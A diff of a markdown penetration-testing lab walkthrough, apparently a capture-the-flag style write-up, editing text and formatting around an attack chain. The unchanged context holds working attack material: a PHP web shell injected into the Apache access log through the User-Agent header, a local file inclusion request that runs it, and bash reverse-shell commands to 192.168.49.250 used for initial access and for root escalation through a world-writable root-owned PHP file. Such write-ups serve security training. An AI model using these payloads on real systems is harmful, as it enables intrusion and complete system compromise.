@@ -85,6 +85,8 @@ drws------   2 www-data www-data     4096 Jun 18  2020 pub
 > So anonymous login is possible on the `FTP` server on port 2121.
 {: .prompt-info }
 
+> Unfortunately there is nothing stored on that server and we are not able upload files because of lack of permissions.
+{: .prompt-danger }
 ---
 
 # exploitation
@@ -222,7 +224,7 @@ Debian-exim:x:115:124::/var/spool/exim4:/usr/sbin/nologin
 ## checking if vulnerability is an LFI
 As we saw in the burp intruder results we are also able to read the file `/var/log/apache2/access.log`.  
 The basic idea is to try to inject `PHP` code into that file and then include it to see if we get code execution via `PHP`.  
-The access log itself seems to be from the web server on port 80. Lets try to inject some simple `PHP` web shell via the user agent.
+The access log itself seems to be from the web server on port 80. Lets try to inject some simple `PHP` web shell via the user agent.  
 payload: `<?php system($_REQUEST['cmd']); ?>`
 ```http
 GET /index.php?teststring HTTP/1.1
@@ -306,7 +308,7 @@ $ nc -lvp 80
 listening on [any] 80 ...
 ```
 
-Trigger the reverse shell.
+Trigger the reverse shell.  
 payload: `bash -c 'bash -i >& /dev/tcp/192.168.49.250/80 0>&1'`
 ```http
 GET /index.php?book=../../../../../../../../var/log/apache2/access.log&cmd=bash+-c+'bash+-i+>%26+/dev/tcp/192.168.49.250/80+0>%261' HTTP/1.1
@@ -358,10 +360,12 @@ root       495  0.0  2.0 196744 21172 ?        S    14:22   0:00 /usr/bin/php -S
 ...
 ```
 
-Stepping through these folders reveals that in the folder `/var/tmp/sv/` there is a file named `index.php` whis is owned and executed by `root` and is world writeble.  
-The corresponding web server listens on localhost on port 57.
-So, the idea is to overwrite the file with own `PHP` code and access the resource on the web server to get `root` access.
-We recycle the reverse shell code we already used.  
+Stepping through these processes reveals that in the folder `/var/tmp/sv/` is a file named `index.php` whis is owned and executed by `root` and is world writeble.  
+The corresponding web server listens on localhost on port 57.  
+
+> So, the idea is to overwrite the file with own `PHP` code and access the resource on the web server to get `root` access.
+> We recycle the reverse shell code we already used.  
+{: .prompt-info }
 
 Overwrite the file with our payload.  
 payload: `bash -c 'bash -i >& /dev/tcp/192.168.49.250/81 0>&1'`  
